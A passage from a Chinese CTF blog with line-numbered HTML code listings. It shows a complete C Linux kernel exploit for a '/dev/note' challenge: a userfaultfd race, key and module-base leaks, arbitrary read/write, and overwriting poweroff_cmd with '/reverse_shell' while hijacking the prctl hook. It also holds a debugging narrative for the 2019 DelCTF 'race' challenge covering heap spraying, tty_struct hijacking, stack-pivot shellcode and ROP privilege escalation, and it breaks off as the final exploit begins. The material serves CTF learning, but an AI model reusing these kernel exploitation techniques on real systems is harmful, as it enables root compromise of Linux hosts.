class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static -pthread xx.c -g -o xx</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FAULT_PAGE ((void*)0x1337000)</span></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> index;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span> * buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_chunk</span>* <span class="title">user_ptr</span>;</span></span><br><span class="line"><span class="keyword">char</span> user_buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    user_ptr-&gt;size = size;</span><br><span class="line">    user_ptr-&gt;buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0xffffff00</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">       <span class="built_in">puts</span>(<span class="string">"[:(]new error..."</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">-1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">size_t</span> index,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    user_ptr-&gt;index = index;</span><br><span class="line">    user_ptr-&gt;buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0xffffff02</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">       <span class="built_in">puts</span>(<span class="string">"[:(]show error..."</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">-1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0xffffff03</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]delete error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">size_t</span> index,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    user_ptr-&gt;index = index;</span><br><span class="line">    user_ptr-&gt;buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0xffffff01</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]edit error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handle</span><span class="params">(<span class="keyword">void</span>* uffd)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">mypollfd</span>;</span></span><br><span class="line"></span><br><span class="line">    mypollfd.fd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)uffd;</span><br><span class="line">    mypollfd.events = POLLIN;</span><br><span class="line">    <span class="keyword">int</span> re = poll(&amp;mypollfd,<span class="number">1</span>,<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(re &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Catch error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]I catch it!!!"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">delete</span>();</span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0</span>,user_buf); <span class="comment">//0</span></span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0</span>,user_buf); <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">	memset(user_buf,'\x00',sizeof(user_buf));</span><br><span class="line">	user_buf[<span class="number">8</span>] = <span class="number">0xf0</span>; </span><br><span class="line"></span><br><span class="line">	uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)user_buf;</span><br><span class="line">	uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)FAULT_PAGE;</span><br><span class="line">	uc.len = <span class="number">0x1000</span>;</span><br><span class="line">	uc.mode = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(ioctl(uffd,UFFDIO_COPY,&amp;uc) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]UFFDIO_COPY error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;  <span class="comment">// 恢复执行copy_from_user</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"[:)]UFFDIO_COPY done!!!"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_uffd</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">myapi</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">myuffd</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> pt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line"></span><br><span class="line">    myapi.api = UFFD_API;</span><br><span class="line">    myapi.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_API,&amp;myapi) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Api error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mmap(FAULT_PAGE,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>) != FAULT_PAGE)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]mmap error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    myuffd.range.start = FAULT_PAGE;</span><br><span class="line">    myuffd.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    myuffd.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_REGISTER,&amp;myuffd) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Register error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> re = pthread_create(&amp;pt,<span class="literal">NULL</span>,handle,(<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span>(re != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Create pthread error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/dev/note"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    user_ptr = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    memset(user_buf,'\x00',sizeof(user_buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0x10</span>,user_buf); <span class="comment">//0</span></span><br><span class="line">    register_uffd();</span><br><span class="line">    edit(<span class="number">0</span>,FAULT_PAGE);</span><br><span class="line"></span><br><span class="line">    show(<span class="number">1</span>,user_buf);</span><br><span class="line">    <span class="keyword">size_t</span> key = *(<span class="keyword">size_t</span>*)user_buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]key = %p\n"</span>,key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0</span>,user_buf);</span><br><span class="line">    show(<span class="number">1</span>,user_buf);</span><br><span class="line">    <span class="keyword">size_t</span> <span class="keyword">module</span> = *((<span class="keyword">size_t</span>*)user_buf+<span class="number">2</span>) ^ key;</span><br><span class="line">    <span class="keyword">module</span> -= <span class="number">0x2568</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]module = %p\n"</span>,<span class="keyword">module</span>);</span><br><span class="line"><span class="comment">//-------------------------------------------------------------------------------</span></span><br><span class="line">    <span class="keyword">size_t</span>* tmp_buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">size_t</span> offset = <span class="keyword">module</span> + <span class="number">0x165</span>;</span><br><span class="line">    tmp_buf[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">1</span>] = <span class="number">4</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">2</span>] = offset ^ key;</span><br><span class="line">    edit(<span class="number">1</span>,tmp_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> page_offset_base_offset = <span class="number">0</span>;</span><br><span class="line">    show(<span class="number">2</span>,&amp;page_offset_base_offset);</span><br><span class="line">    page_offset_base_offset += <span class="number">0xffffffff00000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]page_offset_base_offset = %p\n"</span>,page_offset_base_offset);</span><br><span class="line"></span><br><span class="line">    tmp_buf[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">1</span>] = <span class="number">8</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">2</span>] = (<span class="keyword">module</span> + <span class="number">0x169</span> + page_offset_base_offset) ^ key;</span><br><span class="line">    edit(<span class="number">1</span>,tmp_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> page_offset_base = <span class="number">0</span>;</span><br><span class="line">    show(<span class="number">2</span>,&amp;page_offset_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]page_offset_base = %p\n"</span>,page_offset_base);</span><br><span class="line"><span class="comment">//-------------------------------------------------------------------------------</span></span><br><span class="line">    offset = <span class="keyword">module</span> + <span class="number">0x1cd</span>;</span><br><span class="line">    tmp_buf[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">1</span>] = <span class="number">4</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">2</span>] = offset ^ key;</span><br><span class="line">    edit(<span class="number">1</span>,tmp_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> copy_to_user_offset = <span class="number">0</span>;</span><br><span class="line">    show(<span class="number">2</span>,&amp;copy_to_user_offset);</span><br><span class="line">    copy_to_user_offset += <span class="number">0xffffffff00000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]copy_to_user_offset = %p\n"</span>,copy_to_user_offset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> kernel_base = <span class="keyword">module</span> + page_offset_base + copy_to_user_offset + <span class="number">0x1d1</span> - <span class="number">0x353ee0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]kernel_base = %p\n"</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ffffffff8205d940 D poweroff_cmd</span></span><br><span class="line">    <span class="comment">//ffffffff8131f830 T security_task_prctl</span></span><br><span class="line">    <span class="keyword">size_t</span> poweroff_cmd = kernel_base + (<span class="number">0xffffffff8205d940</span><span class="number">-0xffffffff81000000</span>);</span><br><span class="line">    tmp_buf[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">1</span>] = <span class="number">15</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">2</span>] = (poweroff_cmd - page_offset_base) ^ key;</span><br><span class="line">    edit(<span class="number">1</span>,tmp_buf);</span><br><span class="line">    <span class="built_in">strcpy</span>(user_buf,<span class="string">"/reverse_shell"</span>);</span><br><span class="line">    edit(<span class="number">2</span>,user_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> prctl_hook = kernel_base + <span class="number">0xeb0460</span>;</span><br><span class="line">    <span class="keyword">size_t</span> poweroff_work_func = kernel_base + <span class="number">0xad300</span>;</span><br><span class="line">    tmp_buf[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">1</span>] = <span class="number">8</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">2</span>] = (prctl_hook - page_offset_base) ^ key;</span><br><span class="line">    edit(<span class="number">1</span>,tmp_buf);</span><br><span class="line">    edit(<span class="number">2</span>,&amp;poweroff_work_func);    <span class="comment">//报错</span></span><br><span class="line">    <span class="comment">//prctl(PR_SET_NAME,"xiaoxiaorenwu..");</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="2019DelCTF-race："><a href="#2019DelCTF-race：" class="headerlink" title="2019DelCTF_race："></a>2019DelCTF_race：</h1><p>这道题做的真的难受，最讨厌竞争的题目了，没法调试，只能靠理论和碰撞。开始的竞态读成功了，我本地线程设为8，大概跑二十次能成功一次，设为10的时候成功概率很低。。。设为太小和太大时都成功不了。</p>
<p>然后到<code>O_DIRECT</code>将<code>slub</code>地址写入文件时，又一直打开文件失败，我查了资料说缓冲区大小必须为<code>512</code>的倍数，这也是为什么<code>wp</code>给的<code>buf</code>是用<code>posix_memalign(&amp;buf,512,1024)</code>申请到的，我照做了，然后依然失败，一直返回<code>-1</code>，不知道为啥。。。然后我就想试试普通的写文件，然后<code>mmap</code>映射，然后打开文件是成功的，但是后面会报错。。。。</p>
<p><img src="https://i.loli.net/2020/02/18/p4AvxNibrQOu5GC.png" alt="x1.PNG"></p>
<p>然后调了一下午也没调好。。。太菜了orz。。。真的难受做的，不像那种可以调试的题，这题根本调试不了啊QAQ，或者是我不会调试。。。先放在这吧。</p>
<p>struck了。。。难受。。。</p>
<h2 id="续："><a href="#续：" class="headerlink" title="续："></a>续：</h2><p>我不是轻言放弃的人！！！又看了一天，终于他妈的本地打通了。。。这题是真的恶心。。我果然太菜了orz。这道题值得好好记录一下。</p>
<h3 id="challenge1："><a href="#challenge1：" class="headerlink" title="challenge1："></a>challenge1：</h3><p>为了搞清楚到底为啥<code>panic</code>，我关了<code>kaslr</code>一步一步地跟，在泄露了<code>slub</code>地址后开始查看内核的内存，把所有用户态喷射的内存的别页面都找到了。。。找了好久，我透：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//         0x4000000</span></span><br><span class="line"><span class="comment">//0xffff888000200000-0xffff888000400000</span></span><br><span class="line"><span class="comment">//0xffff888000e09000-0xffff888001000000</span></span><br><span class="line"><span class="comment">//0xffff888001e09000-0xffff888001e0b000</span></span><br><span class="line"><span class="comment">//0xffff888001e10000-0xffff888002000000 </span></span><br><span class="line"><span class="comment">//0xffff888002950000-0xffff888002a90000</span></span><br><span class="line"><span class="comment">//0xffff888002c0d000-0xffff888002c0e000</span></span><br><span class="line"><span class="comment">//0xffff888002c10000-0xffff888004c00000</span></span><br><span class="line"><span class="comment">//0xffff888005e15000-0xffff888005eef000</span></span><br><span class="line"><span class="comment">//0xffff888006800000-0xffff888006a00000</span></span><br><span class="line"><span class="comment">//0xffff888006a2e000-0xffff888007800000</span></span><br><span class="line"><span class="comment">//0xffff888007c00000-0xffff888007fe0000  target:0xffff888007000000</span></span><br></pre></td></tr></table></figure>
<p>我们一共喷了<code>0x4000000</code>大小的内存，我们的<code>target_addr</code>在<code>0xffff88807000000</code>，到这里我终于知道了为啥之前<code>panic</code>了，因为我之前只将泄露的地址的后三位清零了，结果其大部分结果为：<code>0xffff88807bxx000</code>，对着地图可见，这个地址并不在喷射范围内。。。所以一直找不到，后来把后六位都清零了后就可以找得到了，但是貌似这并不是<code>panic</code>的原因。。。因为我们可以看到他的报错是：<code>kernel_buf at mm/slub.c</code>，我们这个找不到地址和这个错误明显无关，真正的原因下一步才找到。</p>
<h3 id="challenge2："><a href="#challenge2：" class="headerlink" title="challenge2："></a>challenge2：</h3><p>找到之后，瞬间报错：</p>
<p><img src="https://i.loli.net/2020/02/19/JW3FOmgU4itZe8S.png" alt="x1.PNG"></p>
<p>我非常疑惑，我明明啥都没干啊。。。为啥又会分配内存？？我猜测报错是在程序返回之后，继续与<code>shell</code>交互时产生的，于是我用<code>getchar</code>在<code>return 0</code>之前卡住：</p>
<p><img src="https://i.loli.net/2020/02/19/Q7WziS1NJmO3c6D.png" alt="x1.PNG"></p>
<p>果然是这样，我们的<code>exp</code>其实没问题，是因为我们竞争写的时候破坏了<code>0x2c0</code>这个size的<code>slab</code>缓冲区，导致<code>shell</code>交互时如果恰好申请<code>0x2c0</code>的内存时就会出错。这也是上一步出错的根本原因。所以我们只要在<code>return</code>之前卡住<code>exp</code>即可。</p>
<h3 id="challenge3："><a href="#challenge3：" class="headerlink" title="challenge3："></a>challenge3：</h3><p>之后就是<code>open(&quot;/dev/ptmx&quot;,2)</code>，我们可以在用户态控制<code>pts</code>，但是和常规的<code>ptmx</code>不同，我调用<code>write</code>时，<code>pts</code>会报错：<code>[   14.688700] general protection fault: 0000 [#1] SMP PTI</code>，到现在也不知道为啥，求大佬解答orz，总之导致我没办法使用<code>mov rax,rsp;..........pop r12.....push r12;ret;</code>这个<code>gadget</code>，但是<code>ioctl</code>只有<code>rdi</code>和<code>rbp</code>和<code>r14</code>指向<code>tty_struct</code>，我没找到合适的<code>gadget</code>来栈迁移，所以只得用<code>set_memory_x</code>来使内存可执行，因为此时<code>rdi</code>恰好为<code>tty_struct</code>，<code>rsi</code>我们可以控制，所以我们就可以运行<code>ring0</code>态的<code>shellcode</code>了。</p>
<h3 id="challenge4："><a href="#challenge4：" class="headerlink" title="challenge4："></a>challenge4：</h3><p>但是我不会写<code>ring0</code>态的<code>shellcode</code>。。。网上查了一波也没什么结果，比较麻烦的是<code>ring0</code>态没有用户态这么多函数<code>aip</code>，首先提权函数我不知道怎么调用，即使可以调用，我也没法成功返回用户态拿shell，因为我没法布置<code>ireq</code>需要的寄存器，c语言不像python有<code>pwntools</code>库，带有<code>asm</code>功能，c的内联汇编只能作为指令，不能汇编成字符串使用。所以想了一会后，觉得还是只能自己写几个<code>gadget</code>，配合当时寄存器的情况来进行栈迁移，最后还是<code>rop</code>提权比价合适。</p>
<p>因为当时<code>rdi</code>为<code>tty_struct</code>地址，所以我的<code>shellcode</code>为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add rdi,0x500;</span><br><span class="line">push rdi;</span><br><span class="line">pop rsp;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>
<p>我已经在<code>tty_struct+0x500</code>处布置好了<code>ropchain</code>，之后就可以<code>rop</code>了。</p>
<h3 id="challenge5："><a href="#challenge5：" class="headerlink" title="challenge5："></a>challenge5：</h3><p>终于，栈被我成功迁移了！！！可以看到我们已经提权成功了，并且<code>ip</code>已经到了<code>get_shell</code>函数里，但是用<code>system</code>开启<code>shell</code>时还是会报错，从显示的错误原因来看应该还是内存申请的问题。</p>
<p><img src="https://i.loli.net/2020/02/19/N5yojUfDZrFAB7c.png" alt="x2.PNG"></p>
<p>然后我换了用<code>execv</code>来开<code>shell</code>，成功开启<code>shell</code>，并且可以输入<code>ls</code>，<code>id</code>等命令，但是<code>cat flag</code>竟然又崩了。。。orz。</p>
<p>最后我只得改用了<code>orw</code>直接打印<code>flag</code>。。。最后开启<code>kaslr</code>也可以成功，把<code>race_read</code>部分加了个循环，就不用了一直按了，不然太麻烦了hhh。最终效果：</p>
<p><img src="https://i.loli.net/2020/02/19/i2wujlYHhvTgm8c.png" alt="x3.PNG"></p>
<p>还是太菜了。。调了快一天半。。。</p>
<h2 id="最终exp："><a href="#最终exp：" class="headerlink" title="最终exp："></a>最终exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span 